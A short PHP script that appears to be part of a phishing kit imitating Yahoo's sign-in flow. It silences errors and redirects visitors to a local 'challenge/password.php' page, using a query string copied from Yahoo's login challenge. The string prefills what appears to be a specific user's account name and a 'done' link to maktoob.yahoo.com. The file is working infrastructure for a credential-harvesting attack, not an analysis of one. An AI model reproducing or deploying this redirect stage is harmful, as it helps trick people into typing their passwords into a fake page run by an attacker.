<?php
//LOCATION !
session_start();
error_reporting(0);

$DIR='./challenge/password.php?display=narrow&lang=en-US&login=jleighw09&done=https%3A%2F%2Fmaktoob.yahoo.com%2F&prefill=0&chllngnm=base&authMechanism=primary&yid=jleighw09&sessionIndex=EN--&acrumb=US';
header("LOCATION: ".$DIR."");
?>
